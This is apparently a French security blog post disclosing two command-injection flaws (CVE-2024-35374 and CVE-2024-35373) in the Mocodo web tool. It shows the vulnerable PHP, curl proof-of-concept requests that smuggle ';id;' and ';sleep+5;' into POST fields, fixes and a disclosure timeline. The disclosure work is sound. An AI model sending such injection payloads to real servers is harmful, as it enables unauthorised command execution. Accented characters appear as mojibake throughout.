

Menu

* [üè† Home](/)
* [üìù Articles](/posts/)
* [#Ô∏è‚É£ Tags](/tags/)
* [üë§ About](/about/)
* [üîê CVEs](/cves/)
* |

LIGHT
DARK

![Cover Image](/img/mocodo-vulnerabilities/mocodonline.svg)
# Exploring Mocodo Vulnerabilities: A Compilation of CVEs from 2024

‚úçÔ∏è **[Valentin Lobstein](https://twitter.com/Chocapikk_)**
¬†|
üóìÔ∏è 9 mai 2024

* [Introduction](/posts/2024/mocodo-vulnerabilities/#introduction)
* [Qu‚Äôest-ce que Mocodo ?](/posts/2024/mocodo-vulnerabilities/#quest-ce-que-mocodo-)
* [D√©couverte des Vuln√©rabilit√©s](/posts/2024/mocodo-vulnerabilities/#d√©couverte-des-vuln√©rabilit√©s)
* [D√©tail Technique de la Vuln√©rabilit√© RCE dans /web/generate.php (CVE-2024-35374)](/posts/2024/mocodo-vulnerabilities/#d√©tail-technique-de-la-vuln√©rabilit√©-rce-dans-webgeneratephp-cve-2024-35374)
  + [Segment de Code Vuln√©rable dans /web/generate.php](/posts/2024/mocodo-vulnerabilities/#segment-de-code-vuln√©rable-dans-webgeneratephp)
  + [Explication](/posts/2024/mocodo-vulnerabilities/#explication)
  + [Exemple d‚Äôexploitation](/posts/2024/mocodo-vulnerabilities/#exemple-dexploitation)
* [D√©tail Technique de la Vuln√©rabilit√© RCE dans /web/rewrite.php (CVE-2024-35373)](/posts/2024/mocodo-vulnerabilities/#d√©tail-technique-de-la-vuln√©rabilit√©-rce-dans-webrewritephp-cve-2024-35373)
  + [Segment de Code Vuln√©rable dans /web/rewrite.php](/posts/2024/mocodo-vulnerabilities/#segment-de-code-vuln√©rable-dans-webrewritephp)
  + [Explication](/posts/2024/mocodo-vulnerabilities/#explication-1)
  + [Exemple de l‚Äôexploitation](/posts/2024/mocodo-vulnerabilities/#exemple-de-lexploitation)
* [Solutions et Recommandations](/posts/2024/mocodo-vulnerabilities/#solutions-et-recommandations)
* [Mesures de Correction Sugg√©r√©es](/posts/2024/mocodo-vulnerabilities/#mesures-de-correction-sugg√©r√©es)
* [Timeline des √âv√©nements](/posts/2024/mocodo-vulnerabilities/#timeline-des-√©v√©nements)
* [Ressources Utiles](/posts/2024/mocodo-vulnerabilities/#ressources-utiles)
* [Remerciements](/posts/2024/mocodo-vulnerabilities/#remerciements)

### Introduction

Dans le monde du d√©veloppement logiciel, la s√©curit√© est un enjeu majeur qui doit constamment √™tre adress√© pour prot√©ger √† la fois les donn√©es et les infrastructures. Cet article vise √† d√©voiler en d√©tail deux vuln√©rabilit√©s critiques d‚Äôex√©cution de commandes √† distance (RCE) d√©couvertes dans Mocodo, un outil populaire utilis√© pour la conception de bases de donn√©es. Ces failles, si elles sont exploit√©es, pourraient permettre √† un attaquant de prendre le contr√¥le du serveur h√©bergeant l‚Äôapplication. Nous discuterons de la nature de ces vuln√©rabilit√©s, de leurs implications potentielles et des mesures √† prendre pour s√©curiser les installations de Mocodo.

### Qu‚Äôest-ce que Mocodo ?

![Mocodo](/img/mocodo-vulnerabilities/mocodo_web.png)

Mocodo est un outil en ligne con√ßu pour aider les d√©veloppeurs et les concepteurs de bases de donn√©es √† visualiser et √† g√©n√©rer des sch√©mas de bases de donn√©es relationnelles √† partir d‚Äôune description textuelle simple. Gr√¢ce √† sa facilit√© d‚Äôutilisation et √† sa capacit√© √† g√©n√©rer des sch√©mas clairs et compr√©hensibles, Mocodo est devenu un choix populaire pour l‚Äôenseignement et les projets professionnels. Toutefois, comme tout logiciel, Mocodo n‚Äôest pas exempt de failles de s√©curit√©, dont certaines peuvent avoir des cons√©quences s√©v√®res.

**Fun Fact:** J‚Äôai d√©couvert Mocodo √† l‚ÄôOteria Cyber School, une √©cole de cybers√©curit√© o√π je poursuis mes √©tudes. Nous avons utilis√© cet outil pour apprendre √† r√©aliser des Mod√®les Conceptuels de Donn√©es (MCD) en cours de base de donn√©es pendant l‚Äôann√©e universitaire 2022-2023. Cette exp√©rience pratique a non seulement enrichi notre compr√©hension th√©orique mais a √©galement soulign√© l‚Äôimportance de la s√©curit√© dans la manipulation et la gestion des sch√©mas de bases de donn√©es.

### D√©couverte des Vuln√©rabilit√©s

Les vuln√©rabilit√©s en question ont √©t√© identifi√©es dans les scripts PHP qui g√®rent certaines entr√©es utilisateur via des formulaires web. Ces scripts ne filtrent pas correctement les entr√©es utilisateur, permettant ainsi l‚Äôinjection et l‚Äôex√©cution de commandes arbitraires sur le serveur o√π Mocodo est install√©.

### D√©tail Technique de la Vuln√©rabilit√© RCE dans /web/generate.php (CVE-2024-35374)

#### Segment de Code Vuln√©rable dans /web/generate.php

```
if ($_POST['conversions']) {
    $transformation_options = "";
    $conversions = array();
    foreach ($_POST['conversions'] as $ext) {
        if ($ext == "_ddl.sql") {
            $transformation_options .= " " . $_POST['sql_case'] . ":labels";
        };
        if ($_POST['with_constraints']) {
            $option = $transformations[str_replace("_mld", "_mld_with_constraints", $ext)];
        } else {
            $option = $transformations[$ext];
        };
        $transformation_options .= " " . $option;
        $conversions[] = $ext;
    };
    $mocodo .= " -t{$transformation_options}";
    $basthon_options .= " --select all -t{$transformation_options}";
};
...
$command_line = "{$mocodo} 2>&1 >/dev/null";
exec($command_line, $out);

```
#### Explication

* **Traitement des conversions** : Le code it√®re sur le tableau `$_POST['conversions']` pour traiter diff√©rents types de fichiers sp√©cifi√©s par l‚Äôutilisateur.
* **Injection de commande** : Si l‚Äôextension `_ddl.sql` est trouv√©e, la valeur de `$_POST['sql_case']` est ajout√©e directement aux options de transformation, ce qui peut inclure des commandes arbitraires si `sql_case` est malicieusement form√©e par un attaquant.

#### Exemple d‚Äôexploitation

Utilisez cette commande curl pour simuler une attaque exploitant cette vuln√©rabilit√© :

```
curl -X POST https://mocodo.net/web/generate.php \
     -d "state=dirty&text=RCE:+rce&conversions[]=_ddl.sql&sql_case=;id;"

```

![PoC](/img/mocodo-vulnerabilities/mocodo_rce.png)

### D√©tail Technique de la Vuln√©rabilit√© RCE dans /web/rewrite.php (CVE-2024-35373)

#### Segment de Code Vuln√©rable dans /web/rewrite.php

```
if (strpos($_SERVER['HTTP_REFERER'], 'localhost')) {
    $mocodo = "~/opt/anaconda3/bin/mocodo";
} else {
    $mocodo = "~/.local/bin/mocodo";
};
$command_line = "{$mocodo} -t " . $_POST['args'] . " 2>&1";
// Execute the command and test the exit code.
// If it is not 0, return an array with a key "err" and the error message.
$out = array();
exec($command_line, $out, $exitCode);
if ($exitCode) {
    echo json_encode(array("err" => implode("\n", $out)));
    exit();
}

```
#### Explication

1. **Choix du chemin d‚Äôacc√®s √† l‚Äôex√©cutable :** Le chemin vers l‚Äôex√©cutable `mocodo` est d√©termin√© en fonction de l‚Äôorigine de la requ√™te. Cela change en fonction du fait que la requ√™te provienne de `localhost` ou non.
2. **Construction de la commande :** Le chemin est ensuite utilis√© pour construire une ligne de commande en y ajoutant `$_POST['args']`, une variable utilisateur qui n‚Äôest pas filtr√©e ni √©chapp√©e, ce qui permet l‚Äôinjection de commandes.
3. **Ex√©cution de la commande :** La commande est ex√©cut√©e avec `exec()`, et la sortie est trait√©e. Si une erreur survient (indiqu√©e par un `exitCode` non nul), un message d‚Äôerreur est renvoy√©.

#### Exemple de l‚Äôexploitation

La vuln√©rabilit√© peut √™tre exploit√©e en envoyant une requ√™te POST avec un payload malveillant dans `args`. Voici comment un attaquant pourrait utiliser `curl` pour injecter une commande simple (`sleep 5`), qui mettrait le serveur en pause pendant 5 secondes :

```
curl -X POST https://mocodo.net/web/rewrite.php \
     -d "state=dirty&text=RCE:+rce&args=;sleep+5;"

```

![PoC](/img/mocodo-vulnerabilities/mocodo_rce2.png)

### Solutions et Recommandations

Pour corriger cette vuln√©rabilit√©, il est crucial d‚Äôimpl√©menter une validation stricte des entr√©es utilisateur et/ou d‚Äô√©chapper toutes les commandes ex√©cut√©es :

* **Utiliser `escapeshellarg()`** pour chaque param√®tre pass√© √† la commande syst√®me pour s‚Äôassurer qu‚Äôaucun caract√®re potentiellement dangereux n‚Äôest interpr√©t√© comme une partie de la commande.
* **Validation des entr√©es** pour s‚Äôassurer que les donn√©es transmises correspondent √† des valeurs attendues et s√©curis√©es avant de les utiliser dans un contexte de commande syst√®me.

Ces mesures aideront √† pr√©venir l‚Äôex√©cution non autoris√©e de commandes sur le serveur et renforceront la s√©curit√© globale de l‚Äôapplication.

### Mesures de Correction Sugg√©r√©es

* **√âchappement des commandes** : utiliser `escapeshellarg()` sur `$_POST['sql_case']` et `$_POST['args']` pour s‚Äôassurer que toutes les entr√©es soient s√©curis√©es.

### Timeline des √âv√©nements

* **9 mai 2024** : D√©tection des vuln√©rabilit√©s d‚Äôex√©cution de commandes √† distance (RCE) dans Mocodo.
* **9 mai 2024** : Notification des vuln√©rabilit√©s √† l‚Äô√©quipe de Mocodo via leur canal de communication officiel.
* **9 mai 2024** : R√©ponse de l‚Äô√©quipe Mocodo, reconnaissant la r√©ception du signalement des vuln√©rabilit√©s quelques heures apr√®s la notification.
* **9 mai 2024** : Vuln√©rabilit√© corrig√©e dans la version 4.2.7
* **9 mai 2024** : Publication de l‚Äôarticle

### Ressources Utiles

Pour ceux int√©ress√©s √† en apprendre davantage sur Mocodo ou √† contribuer √† l‚Äôam√©lioration de sa s√©curit√©, voici des liens utiles :

* [Mocodo Online](https://mocodo.net) - La plateforme en ligne o√π Mocodo est accessible pour la cr√©ation de sch√©mas de bases de donn√©es.
* [GitHub - Mocodo](https://github.com/laowantong/mocodo/) - Le d√©p√¥t GitHub de Mocodo, d√©velopp√© par Aristide Grange, o√π le code source est disponible et o√π les contributions communautaires sont bienvenues.

### Remerciements

Je remercie sinc√®rement l‚Äô√©quipe de Mocodo, et particuli√®rement le d√©veloppeur Aristide Grange, pour leur r√©ponse rapide et leur reconnaissance de l‚Äôimportance de ces probl√®mes de s√©curit√©.

¬© 2024 Valentin Lobstein (Chocapikk) üõ°Ô∏è.

